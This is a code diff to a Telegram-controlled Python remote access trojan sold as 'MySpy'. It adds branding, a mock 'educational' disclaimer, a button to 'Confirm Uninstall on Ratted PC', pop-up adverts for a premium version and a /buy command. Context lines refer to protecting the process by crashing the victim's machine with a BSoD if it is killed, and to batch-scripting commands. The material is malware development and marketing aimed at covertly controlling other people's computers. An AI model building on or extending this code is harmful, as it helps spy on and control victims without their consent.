@@ -1,3 +1,12 @@
+#Made for Educational shit lol
+
+#Made by Olivier/SympactDev
+
+
+
+
+
+
 from RAT                           import *
 
 from Core.Settings.Organization    import *
@@ -81,8 +90,8 @@ main3.row(button2)
 main3.row(button3)
 
 main4 = telebot.types.InlineKeyboardMarkup()
-button1 = telebot.types.InlineKeyboardButton('Yes, im sure!', callback_data='uninstall')
-button2 = telebot.types.InlineKeyboardButton('Hell no!', callback_data='cancel')
+button1 = telebot.types.InlineKeyboardButton('Confirm Uninstall on Ratted PC', callback_data='uninstall')
+button2 = telebot.types.InlineKeyboardButton('Stfu no', callback_data='cancel')
 button3 = telebot.types.InlineKeyboardButton('« Back', callback_data='cancel')
 main4.row(button1)
 main4.row(button2)
@@ -227,6 +236,12 @@ if DisplayMessageBox is True:
 	if not os.path.exists(Directory + 'DisplayMessageBox'):
 		open(Directory + 'DisplayMessageBox', 'a').close()
 		MessageBox(Message)
+		MessageBox("You are using a free version of MySpy! DM Olivier#8001 for premium!")
+
+if DisplayMessageBox is False:
+	if not os.path.exists(Directory + 'DisplayMessageBox'):
+		open(Directory + 'DisplayMessageBox', 'a').close()
+		MessageBox("You are using a free version of MySpy! DM Olivier#8001 for premium!")
 
 
 # Protect process with BSoD (if killed).
@@ -1319,7 +1334,14 @@ def Info(command):
 
 	except:
 		pass
-
+@bot.message_handler(commands=['Buy', 'buy'])
+def Buy(command):
+	bot.send_message(command.chat.id,
+		'ᅠᅠᅠᅠ 🤑 *Buy* 🤑'
+		'\n'
+	    '\n *Retrieved Data: '
+		'\n*Coded by SympactDev - Python*', 
+			reply_markup=menu, parse_mode='Markdown')
 
 # Command handler / help
 
@@ -1379,6 +1401,7 @@ def Help(command):
 		'\n*/BAT* - _Batch Scripting_'
 		'\n'
 		'\n'
+		'\n*/BUY* - _Buy Premium MySpy (WIP)'
 		'\n*Coded by SympactDev - Python*', 
 			reply_markup=menu, parse_mode='Markdown')
 
